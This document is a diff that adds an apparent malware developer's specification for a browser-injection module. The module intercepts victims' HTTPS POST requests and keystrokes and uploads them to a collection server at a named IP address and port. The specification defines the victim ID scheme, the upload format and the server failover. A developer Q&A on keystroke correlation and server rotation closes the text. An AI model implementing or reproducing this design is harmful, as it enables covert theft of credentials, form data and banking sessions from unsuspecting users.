@@ -1,0 +1,25 @@
+Test server 188.138.1.53:8082
+
+1 The client part should send every intercepted POST request that was sent by the browser over SSL/TLS. In addition to the full contents of the POST request (with hiders), it should also send the full URL of the request and the keystroke log. In case the post does not fit the rules or the backend of the admin has temporarily turned off the injection of this link
+
+The full URL is extracted from the request itself by gluing the contents of the Host hider and the document name (URI). The prefix "https://" is not needed at the front
+The keystroke log should be in any human-readable form.
+2 Data is sent to the server via HTTP POST requests.  There can be any number of reverse-proxy, load-balancer and DNAT between the server and the client. Thus, there is no way to know the client's ip address.
+2.1 Each request has three components in the URI separated by "/" - group tag, client id .  Each POST has a URI of the following format:
+/<group-tag>/<clientid>/60/
+where group-tag is the group tag, clientid is the client id.
+2.1.1 The group tag is an arbitrary string consisting of characters (a-z) and numbers (0-9). The parameter is case insensitive.
+2.1.2 Client Id is a string consisting of two dot-separated components. The first part has the format <name>_XYYYYYYYYYYY, where name is some name that can somehow identify the machine (computer name or user name, depending on the type of operating system), X is a character denoting the type of system the client is running on (W - windows, L - linux, A - android, M - Mac OS), YYYYYYYYY - 3-7 digits containing major-version, minor-version and build of the operating system if the system has them (for example, for 6. 1 build 7600 it will be 617.1 build 7600 it will be 617600). The second part contains 32 random characters 0-9, A-F. An example of a client id is QWERTY_W617600.11223344556677889900AABBCCDDEEFF. The parameter is not case sensitive.
+2.2 A caddy server response can be with the following HTTP codes: 200 and 403. A 200 response always has a body with content "/1/" (content-type: text/plain), and a 403 response is used if the request is not a POST request, the POST body has an unknown format or fields, the URI has an unknown format, or the clientid has an incorrect format.
+3 POST request has a body in multipaty/form-data format. And has the following fields:
+3.1 "data" - binary data, up to 32 KB in size. The sought POST-request hiders and body
+3.2 "keys" - UTF-8 string. Maximum length 1024 characters. Text of captured keystrokes
+3.3 "link" - UTF-8 string. Maximum length 4096. Host+URI link string
+is the link where the original post was sent.
+
+3.4 "image" - binary data, not used
+1. on logging keystrokes. Suppose I log all the clicks in the browser. What is the criterion for comparing clicks with post sending? Because a post can theoretically be sent by some ajax script. It needs to be clearer. Either all clicks from the previous post. Or clicks for the last 2-4 minutes. Or other options.2. group tag/client id (in uri) - I take it these are the same ones I already send in din.injects (from parentdata)?
+for configuration, let it be like this: <dpost><handler>11.22.33.44:port</handler> <handler>....</handler></dpost>
+3. It is also unclear why several servers should be in the list. What is the principle to choose which server to send to?
+1. All clicks from the previous send 2. Yes 3. choose a random one - if it turned out to be killed, the next one is taken, if at the end of the list - to the beginning. If none of them is working, stop sending for 5 minutes. Then try the random one again, if it is not working, then the next one.
+
